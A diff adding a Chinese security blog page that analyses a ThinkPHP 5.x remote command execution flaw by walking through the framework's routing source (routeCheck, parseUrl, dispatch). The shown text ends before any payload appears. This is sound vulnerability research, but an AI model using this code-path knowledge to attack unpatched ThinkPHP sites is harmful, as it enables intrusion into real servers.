@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="baidu-site-verification" content="L6Lm9d5Crl">
+  
+  
+  
+  
+  <title>ThinkPHP 5.x远程命令执行漏洞分析与复现 | Ordin</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="info">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 5.x远程命令执行漏洞分析与复现">
+<meta property="og:url" content="https://leave-Devour.github.io/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/index.html">
+<meta property="og:site_name" content="Ordin">
+<meta property="og:description" content="info">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505144530317.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505144717924.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505145756766.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505154537634.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505152811767.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505155059666.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505155643312.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505160544928.png">
+<meta property="og:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505163614190.png">
+<meta property="og:updated_time" content="2020-05-05T08:42:59.908Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP 5.x远程命令执行漏洞分析与复现">
+<meta name="twitter:description" content="info">
+<meta name="twitter:image" content="https://leave-devour.github.io/2020/05/05/AppData/Roaming/Typora/typora-user-images/image-20200505144530317.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Ordin" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/avatar.png" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Ordin</a></h1>
+        </hgroup>
+        
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="/archives/">博客主页</a></li>
+                        
+                            <li><a  href="/archives/">所有文章</a></li>
+                        
+                            <li><a  href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github"  target="_blank" href="https://github.com/leave-Devour" title="github">github</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7351903473" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Automation/" style="font-size: 20px;">Automation</a> <a href="/tags/kernel/" style="font-size: 20px;">kernel</a> <a href="/tags/linux-kernel-pwn/" style="font-size: 20px;">linux kernel pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 10px;">pwnable.kr</a> <a href="/tags/reversing-kr/" style="font-size: 10px;">reversing.kr</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.cnblogs.com/liyuechan/">csdn</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">ture</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Ordin</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/avatar.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Ordin</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/archives/">博客主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/leave-Devour" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/7351903473" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-ThinkPHP-5-x远程命令执行漏洞分析与复现" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2020/05/05/ThinkPHP-5-x远程命令执行漏洞分析与复现/" class="article-date">
+      <time datetime="2020-05-05T05:56:51.000Z" itemprop="datePublished">2020-05-05</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ThinkPHP 5.x远程命令执行漏洞分析与复现
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <center><font size="5">info</font></center>
+<a id="more"></a>
+
+<p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。</p>
+<p><a href="https://blog.thinkphp.cn/869075" target="_blank" rel="noopener">补丁发布</a></p>
+<p>thinkphp的目录结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">project  应用部署目录</span><br><span class="line">├─application           应用目录（可设置）</span><br><span class="line">│  ├─common             公共模块目录（可更改）</span><br><span class="line">│  ├─index              模块目录(可更改)</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         应用公共（函数）文件</span><br><span class="line">│  ├─config.php         应用（公共）配置文件</span><br><span class="line">│  ├─database.php       数据库配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─route.php          路由配置文件</span><br><span class="line">├─extend                扩展类库目录（可定义）</span><br><span class="line">├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">│  ├─index.php          应用入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于 apache 的重写</span><br><span class="line">├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">├─vendor                第三方类库目录（Composer）</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言包目录</span><br><span class="line">│  ├─library            框架核心类库目录</span><br><span class="line">│  │  ├─think           Think 类库包目录</span><br><span class="line">│  │  └─traits          系统 Traits 目录</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">│  ├─.travis.yml        CI 定义文件</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─composer.json      composer 定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">│  ├─README.md          README 文件</span><br><span class="line">│  └─start.php          框架引导文件</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>
+
+<p><code>public</code>目录为web可访问目录。</p>
+<p>5.0的URL访问受路由控制，在关闭路由或者没有配置路由的情况下，一般URL的访问方式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+<p>这次的远程命令执行的bug就出现在路由检测。</p>
+<p>分析：</p>
+<p>首先看看入口文件：</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505144530317.png" alt="image-20200505144530317"></p>
+<p>最后执行了app.php 里面的run函数</p>
+<p>然后看看run()</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505144717924.png" alt="image-20200505144717924"></p>
+<p>然后直接往下看，找到路由检测</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505145756766.png" alt="image-20200505145756766"></p>
+<p><code>$dispatch = $this-&gt;routeCheck()-&gt;init();</code> 看这个可以看到先执行routerCheck 然后再到init()</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505154537634.png" alt="image-20200505154537634"></p>
+<p>可以看出，在没有配置路由的情况下，会进入路由检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//routeCheck</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测路由缓存</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;appDebug &amp;&amp; <span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'route_check_cache'</span>)) &#123;</span><br><span class="line">            $routeKey = <span class="keyword">$this</span>-&gt;getRouteCacheKey();</span><br><span class="line">            $option   = <span class="keyword">$this</span>-&gt;config-&gt;get(<span class="string">'route_cache_option'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($option &amp;&amp; <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;has($routeKey)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;get($routeKey);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;cache-&gt;has($routeKey)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;get($routeKey);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取应用调度信息</span></span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 是否强制路由模式</span></span><br><span class="line">        $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测 返回一个Dispatch对象</span></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($routeKey)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($option) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;cache-&gt;connect($option)-&gt;tag(<span class="string">'route_cache'</span>)-&gt;set($routeKey, $dispatch);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;cache-&gt;tag(<span class="string">'route_cache'</span>)-&gt;set($routeKey, $dispatch);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 存在闭包的时候缓存无效</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $dispatch;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505152811767.png" alt="image-20200505152811767"></p>
+<p>然后再调用到init函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入parseUrl</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $depr = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'pathinfo_depr'</span>);</span><br><span class="line">        $bind = <span class="keyword">$this</span>-&gt;rule-&gt;getRouter()-&gt;getBind();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($bind) &amp;&amp; preg_match(<span class="string">'/^[a-z]/is'</span>, $bind)) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, $bind);</span><br><span class="line">            <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">$this</span>-&gt;rule-&gt;parseUrlPath($url); <span class="comment">//解析url然后生成数组返回来</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析模块</span></span><br><span class="line">        $module = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'app_multi_module'</span>) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;param[<span class="string">'auto_search'</span>]) &#123;</span><br><span class="line">            $controller = <span class="keyword">$this</span>-&gt;autoFindController($module, $path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 解析控制器</span></span><br><span class="line">            $controller = !<span class="keyword">empty</span>($path) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析操作</span></span><br><span class="line">        $action = !<span class="keyword">empty</span>($path) ? array_shift($path) : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析额外参数</span></span><br><span class="line">        <span class="keyword">if</span> ($path) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)) &#123;</span><br><span class="line">                $var += $path;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                preg_replace_callback(<span class="string">'/(\w+)\|([^\|]+)/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> <span class="title">use</span> <span class="params">(&amp;$var)</span> </span>&#123;</span><br><span class="line">                    $var[$match[<span class="number">1</span>]] = strip_tags($match[<span class="number">2</span>]);</span><br><span class="line">                &#125;, implode(<span class="string">'|'</span>, $path));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $panDomain = <span class="keyword">$this</span>-&gt;request-&gt;panDomain();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($panDomain &amp;&amp; $key = array_search(<span class="string">'*'</span>, $var)) &#123;</span><br><span class="line">            <span class="comment">// 泛域名赋值</span></span><br><span class="line">            $var[$key] = $panDomain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置当前请求的参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;setRouteVars($var);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 封装路由</span></span><br><span class="line">        $route = [$module, $controller, $action];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasDefinedRoute($route, $bind)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'invalid request:'</span> . str_replace(<span class="string">'|'</span>, $depr, $url));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $route;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">        $url = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, $url);</span><br><span class="line">        $url = trim($url, <span class="string">'/'</span>);</span><br><span class="line">        $var = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'?'</span>)) &#123; </span><br><span class="line">            <span class="comment">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            $info = parse_url($url);</span><br><span class="line">            $path = explode(<span class="string">'/'</span>, $info[<span class="string">'path'</span>]);</span><br><span class="line">            parse_str($info[<span class="string">'query'</span>], $var);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">            $path = explode(<span class="string">'/'</span>, $url);</span><br><span class="line">            <span class="comment">//以 ”/“ 为分割 url explode() 函数把字符串打散为数组。</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'='</span>)) &#123;</span><br><span class="line">            <span class="comment">// 参数1=值1&amp;参数2=值2...</span></span><br><span class="line">            $path = [];</span><br><span class="line">            parse_str($url, $var);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $path = [$url];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$path, $var];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505155059666.png" alt="image-20200505155059666"></p>
+<p>parseUrl函数接下来就是把控制器，模块 还有调用方法给提取出来，然后封装路由</p>
+<p> <img src="../AppData/Roaming/Typora/typora-user-images/image-20200505155643312.png" alt="image-20200505155643312"></p>
+<p>看到run函数下面的</p>
+<p><img src="../AppData/Roaming/Typora/typora-user-images/image-20200505160544928.png" alt="image-20200505160544928"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检测路由after行为</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">'after'</span>])) &#123;</span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">'after'</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">                <span class="keyword">return</span> $dispatch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据自动验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">'validate'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">'validate'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个run是在后面解析完再执行的。</p>
+<p>上面用匿名函数增加了一个中间件。返回时候调用了dispatch</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Request $request, $type = <span class="string">'route'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> call_user_func(<span class="keyword">$this</span>-&gt;resolve($type), $request);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
